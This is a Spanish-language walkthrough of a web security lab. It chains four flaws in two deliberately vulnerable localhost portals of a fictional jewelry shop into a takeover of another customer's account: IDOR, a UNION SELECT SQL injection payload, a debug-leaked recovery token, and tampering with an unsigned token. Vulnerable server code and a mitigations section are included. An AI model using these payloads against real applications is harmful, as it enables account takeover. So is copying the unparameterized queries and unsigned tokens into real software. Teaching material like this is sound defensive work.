FORT KNOX — Cadena de Ataque

Laboratorio de seguridad web sobre dos portales vulnerables de una joyería ficticia.

Portal de Clientes · :5000 Portal de Seguimiento · :5001
Escenario
El atacante es un cliente real de Fort Knox Joyas con una cuenta legítima. A partir de su propio envío, encadena cuatro vulnerabilidades para tomar el control de la cuenta de otro cliente (carlos_gomez) sin conocer su contraseña.
0
Setup — El atacante se loguea en su cuenta legítima Clientes :5000

El atacante tiene una cuenta real. Al loguearse en el portal de clientes se crea la cookie de sesión fk_session.

POST /login
attacker / FK2026!
→
Set-Cookie: fk_session=...
REQUEST
POST http://localhost:5000/login
username=attacker &password=FK2026!
Clave SSO: ambos portales comparten secret_key = 'fortknox-sso-shared-secret-2026' y el nombre de cookie fk_session. Los navegadores envían la cookie a localhost sin distinguir por puerto, por lo que esta sesión también es válida en el portal de seguimiento (:5001).
1
IDOR — Ver el envío de la víctima A01 · BOLA Tracking :5001

El atacante recibió el link de su propio envío por email (shipment_id=48291). Cambia el ID en la URL y accede al envío de Carlos Gómez sin ninguna verificación de pertenencia.

Mi envío: 48291
→
Cambio ID en la URL
→
Envío ajeno: 19384
REQUEST
GET http://localhost:5001/tracking?shipment_id=19384

// El servidor no verifica que shipment_id pertenezca al usuario autenticado
Nombre
Carlos Gomez
Email
carlos.gomez@gmail.com
user_id
1
Orden
ORD-2026-1001
Raíz del problema: el endpoint valida que haya cookie SSO pero no compara el user_id del envío con el de la sesión activa. Cualquier ID es consultable por fuerza bruta.
2
SQL Injection — Extraer el username A05 · SQLi Tracking :5001

El formulario de búsqueda por email concatena el parámetro directamente en la query SQL. El atacante inyecta un UNION SELECT para extraer el username de la víctima.

BÚSQUEDA NORMAL
GET http://localhost:5001/?email=carlos.gomez@gmail.com

→ devuelve: ORD-2026-1001, En camino (sin username)
PAYLOAD INYECTADO
GET http://localhost:5001/?email=' UNION SELECT id, username, first_name, last_name, email FROM users WHERE email='carlos.gomez@gmail.com'--
QUERY RESULTANTE EN EL SERVIDOR
SELECT s.shipment_id, s.order_number, s.status, ...
FROM shipments s JOIN users u ON s.user_id = u.id
WHERE u.email = '' UNION SELECT id, username, first_name,
                  last_name, email FROM users WHERE email='carlos.gomez@gmail.com'--
Username extraído
carlos_gomez
Raíz del problema: el backend construye la query con f-string: f"WHERE u.email = '{email}'" sin usar consultas parametrizadas. No hay contraseñas en la tabla, pero el username es suficiente para el paso siguiente.
3
Security Misconfiguration — Token expuesto en la respuesta A02 · Misconfig Clientes :5000

El endpoint de recuperación de cuenta devuelve el token directamente en la respuesta HTML dentro de un bloque de debug que nunca fue removido antes del deploy.

REQUEST
POST http://localhost:5000/account/recover
username=carlos_gomez
FRAGMENTO DEL HTML DE RESPUESTA
<div style="background: #1e293b;">
  [DEBUG] recovery_token:
  eyJ1c2VyIjogImNhcmxvc19nb21leiIsICJhdXRob3Jp...
  <!-- TODO: remove before production deploy -->
</div>
TOKEN DECODIFICADO (base64url → JSON)
{
  "user": "carlos_gomez",
  "authorized_email": "carlos.gomez@gmail.com",
  "exp": "2026-05-19T01:00:00Z"
}
Raíz del problema: el desarrollador dejó un bloque de debug en el código de producción. El token debería enviarse únicamente al email registrado del dueño de la cuenta, nunca retornarse en la respuesta HTTP.
4
Token Tampering — Tomar el control de la cuenta A08 · Deserialización Clientes :5000

El token es JSON codificado en base64url sin ninguna firma ni HMAC. El atacante lo modifica para poner su propio email como authorized_email y el servidor lo acepta sin verificar integridad.

1 — DECODIFICAR
base64url.decode(token)
→ { "user": "carlos_gomez", "authorized_email": "carlos.gomez@gmail.com" }
2 — MODIFICAR authorized_email
{ "user": "carlos_gomez", "authorized_email": "attacker@mailinator.com" }
3 — RE-CODIFICAR Y ENVIAR
GET http://localhost:5000/account/confirm-recovery?
    token=eyJ1c2VyIjogImNhcmxvc19nb21leiIsICJhdXRob3JpemVkX2VtYWlsIjogImF0dGFja2VyQG1haWxpbmF0b3IuY29tIn0
CÓDIGO VULNERABLE EN EL SERVIDOR
# A08: sin verificacion de firma
payload = json.loads(base64.urlsafe_b64decode(token))
# acepta cualquier JSON valido, firmado o no
conn.execute('UPDATE users SET email = ?', (payload['authorized_email'],))
Resultado
Sesión iniciada como carlos_gomez.
Email de la cuenta actualizado a attacker@mailinator.com.
Acceso total a la cuenta de la víctima.
Raíz del problema: el token no está firmado con ningún secreto (HMAC-SHA256, JWT, etc.). El servidor confía ciegamente en el contenido decodificado. La corrección sería firmar el token al generarlo y verificar la firma antes de procesarlo.
Resumen de la cadena
Paso Portal Endpoint Vulnerabilidad Dato obtenido
0 Clientes POST /login — Cookie SSO fk_session
1 Tracking GET /tracking?shipment_id=19384 A01 IDOR Nombre, email y user_id de la víctima
2 Tracking GET /?email=' UNION SELECT… A05 SQLi Username: carlos_gomez
3 Clientes POST /account/recover A02 Misconfig Token de recuperación en texto claro
4 Clientes GET /account/confirm-recovery?token=… A08 Tampering Acceso total a la cuenta de carlos_gomez
Mitigaciones
A01 — Verificar ownership
Comparar el user_id del recurso con el user_id de la sesión antes de devolver el resultado.
A05 — Consultas parametrizadas
Usar cursor.execute(query, (param,)) en lugar de f-strings. Nunca concatenar input del usuario en SQL.
A02 — Remover debug en producción
El token de recuperación debe enviarse únicamente por email al dueño de la cuenta. Nunca retornarlo en la respuesta HTTP.
A08 — Firmar el token (HMAC)
Usar hmac.new(secret, payload, sha256) o JWT firmado. Verificar la firma antes de procesar cualquier campo del token.
